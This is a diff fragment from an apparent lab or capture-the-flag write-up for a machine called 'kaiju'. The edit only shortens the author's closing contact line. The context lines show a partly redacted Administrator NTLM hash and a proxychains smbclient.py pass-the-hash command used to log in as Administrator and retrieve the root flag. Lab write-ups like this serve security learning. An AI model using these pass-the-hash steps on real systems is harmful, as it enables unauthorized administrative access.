@@ -340,5 +340,5 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b[...]40:::
 # and u can connect to the smb to retrieve the root flag
 proxychains -q smbclient.py 'bersrv100.kaiju.vl'/'Administrator'@10.10.200.181 -hashes :'0b[...]40'
 ```
-Nice ! if you have any questions or comments on this write up you can dm me on [instagram](https://instagram.com/eliott.la) or on discord : 'ethicxz.'
+Nice ! If you have any questions you can dm me on discord : 'ethicxz.'
 
